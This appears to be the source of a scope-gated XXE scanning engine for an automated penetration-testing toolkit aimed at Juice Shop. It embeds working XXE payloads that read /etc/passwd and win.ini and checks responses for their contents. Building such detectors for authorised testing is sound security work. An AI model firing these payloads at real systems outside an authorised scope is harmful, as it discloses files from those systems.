"""
tools/engines/xxe_engine.py
============================
XML External Entity (XXE) injection detection engine.

Usage: python tools/engines/xxe_engine.py '{"target_url": "http://host:port", "endpoint": "/api/xml", "method": "POST", "headers": {}, "scope_file": "juiceshop_scope.json"}'

Why this exists: XXE is explicitly named in juiceshop_scope.json's focus list, but
until now there was no engine for it at all -- a real, verified gap found by
cross-referencing the current 9 engines against a real corpus of HackerOne
top-report bug categories (27 categories; XXE, CSRF, clickjacking were the
clearest gaps with zero coverage).

Scope: this engine tests classic in-band file-disclosure XXE only (external
entity resolves to a local file, and its content is reflected back in the
response). It deliberately does NOT attempt entity-expansion/"billion laughs"
payloads (a DoS technique, out of scope for this codebase's safety posture) or
out-of-band/blind XXE (which needs a listener server this engine doesn't stand
up). A confirmed file-disclosure hit is strong enough evidence on its own to
report; blind XXE would need a follow-up manual test with a real OOB listener.

Same embedded-scope-gate pattern as http_smuggling_engine.py: this is invoked
via run_shell, which bypasses execute_tool's api_request scope check entirely,
so the gate has to live here.
"""

import sys
import os
import json
import requests

_PROJECT_ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
if _PROJECT_ROOT not in sys.path:
    sys.path.insert(0, _PROJECT_ROOT)

from tools.engagement_scope import EngagementGate
from tools.gate_guarded_request import is_url_allowed


# Each payload targets a well-known, OS-specific file whose content has an
# unmistakable signature -- avoids false positives from a server that just
# echoes back arbitrary XML content unrelated to entity resolution.
PAYLOADS = [
    {
        "name": "linux_passwd",
        "xml": '<?xml version="1.0" encoding="UTF-8"?>\n'
               '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n'
               '<foo>&xxe;</foo>',
        "signature": "root:",
    },
    {
        "name": "windows_win_ini",
        "xml": '<?xml version="1.0" encoding="UTF-8"?>\n'
               '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>\n'
               '<foo>&xxe;</foo>',
        "signature": "[fonts]",
    },
    {
        # Some parsers only resolve entities used as an XML *attribute* value,
        # not as element content -- a distinct code path worth trying separately.
        "name": "linux_passwd_attribute",
        "xml": '<?xml version="1.0" encoding="UTF-8"?>\n'
               '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n'
               '<foo attr="&xxe;">test</foo>',
        "signature": "root:",
    },
]


def run(data: dict) -> dict:
    target_url = data.get("target_url", "").rstrip("/")
    endpoint = data.get("endpoint", "")
    method = data.get("method", "POST").upper()
    headers = dict(data.get("headers") or {})
    scope_file = data.get("scope_file")

    full_url = target_url + endpoint

    if not scope_file:
        return {"confirmed": False, "blocked_reason": "No 'scope_file' provided -- refusing to probe without an explicit engagement scope to check against."}
    if not os.path.isfile(scope_file):
        return {"confirmed": False, "blocked_reason": f"scope_file '{scope_file}' not found."}

    with open(scope_file, "r", encoding="utf-8") as f:
        scope = json.load(f)
    gate = EngagementGate(scope)

    gate_ok, gate_reason = gate.check(full_url)
    if not gate_ok:
        return {"confirmed": False, "blocked_reason": gate_reason}

    # TRUSTED-CHANNEL gate (authoritative): caller scope_file can only NARROW; the request must also be
    # allowed by SABRINA_ACTIVE_SCOPE_FILE, so a permissive caller scope can't widen it. Fail-closed.
    trusted_ok, trusted_reason = is_url_allowed(full_url)
    if not trusted_ok:
        return {"confirmed": False, "blocked_reason": f"trusted-scope: {trusted_reason}"}

    headers.setdefault("Content-Type", "application/xml")

    results = {"confirmed": False, "target": full_url, "attempts": []}

    for payload in PAYLOADS:
        gate.throttle()
        attempt = {"payload_name": payload["name"]}
        try:
            resp = requests.request(method, full_url, headers=headers, data=payload["xml"].encode("utf-8"), timeout=15)
            attempt["status_code"] = resp.status_code
            body = resp.text
            if payload["signature"] in body:
                attempt["classification"] = "CONFIRMED_FILE_DISCLOSURE"
                attempt["evidence"] = body[:500]
                results["confirmed"] = True
                results["confirmed_payload"] = payload["name"]
            else:
                attempt["classification"] = "NO_SIGNAL"
                attempt["response_preview"] = body[:200]
        except requests.exceptions.RequestException as e:
            attempt["classification"] = "ERROR"
            attempt["error"] = str(e)
        results["attempts"].append(attempt)
        if results["confirmed"]:
            break  # No need to keep firing payloads once one is confirmed

    if results["confirmed"]:
        results["summary"] = (
            f"CONFIRMED XXE file disclosure on {full_url} via '{results['confirmed_payload']}' payload. "
            f"External entity resolved and its content was reflected in the response."
        )
    else:
        results["summary"] = f"No in-band file-disclosure XXE signal on {full_url} for any tried payload. Does not rule out blind/OOB XXE (not tested by this engine)."

    return results


def main():
    if len(sys.argv) != 2:
        raise ValueError("Please provide a JSON string as the first argument.")
    data = json.loads(sys.argv[1])
    output = run(data)
    print(json.dumps(output, indent=2))


if __name__ == "__main__":
    main()
